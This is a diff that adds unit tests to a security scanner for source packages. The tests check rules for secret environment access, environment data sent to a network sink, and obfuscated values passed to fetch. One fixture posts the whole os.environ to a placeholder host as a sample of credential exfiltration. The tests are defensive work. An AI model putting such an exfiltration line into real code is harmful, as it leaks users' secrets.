@@ -124,13 +124,92 @@ class SecurityGateTests(unittest.TestCase):
             {item.rule_id for item in result.findings},
         )
 
+    def test_benign_platform_environment_probe_is_clear(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="integration_test/app_test.dart",
+                    content=(
+                        "final simulator = Platform.environment"
+                        ".containsKey('SIMULATOR_DEVICE_NAME');"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
+        self.assertNotIn(
+            "secret_environment_access",
+            {item.rule_id for item in result.findings},
+        )
+
     def test_secret_environment_access_requires_review(self) -> None:
         result = scan_source_artifacts(
-            [SourceArtifact(path="lib/config.dart", content="final env = Platform.environment;")]
+            [
+                SourceArtifact(
+                    path="lib/config.dart",
+                    content="final key = Platform.environment['API_KEY'];",
+                )
+            ]
         )
         self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
         self.assertFalse(result.certification_eligible)
         self.assertIn("secret_environment_access", {item.rule_id for item in result.findings})
+
+    def test_environment_access_near_network_sink_requires_high_review(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="tool.py",
+                    content=(
+                        "env = os.environ\n"
+                        "requests.post('https://example.invalid', json=dict(env))\n"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
+        finding = next(
+            item
+            for item in result.findings
+            if item.rule_id == "environment_exfiltration_requires_review"
+        )
+        self.assertEqual(finding.severity, SecuritySeverity.HIGH)
+
+    def test_benign_character_generation_is_not_obfuscation(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="example/lib/main.dart",
+                    content=(
+                        "final values = List<int>.generate(20, (_) => 65);\n"
+                        "return String.fromCharCodes(values);\n"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.CLEAR)
+        self.assertNotIn(
+            "suspicious_obfuscation",
+            {item.rule_id for item in result.findings},
+        )
+
+    def test_encoded_value_near_network_sink_requires_review(self) -> None:
+        result = scan_source_artifacts(
+            [
+                SourceArtifact(
+                    path="lib/client.dart",
+                    content=(
+                        "final target = String.fromCharCodes(encoded);\n"
+                        "fetch(target);\n"
+                    ),
+                )
+            ]
+        )
+        self.assertEqual(result.verdict, SecurityVerdict.REVIEW)
+        self.assertIn(
+            "suspicious_obfuscation",
+            {item.rule_id for item in result.findings},
+        )
 
     def test_pubspec_overrides_requires_review(self) -> None:
         result = scan_source_artifacts(
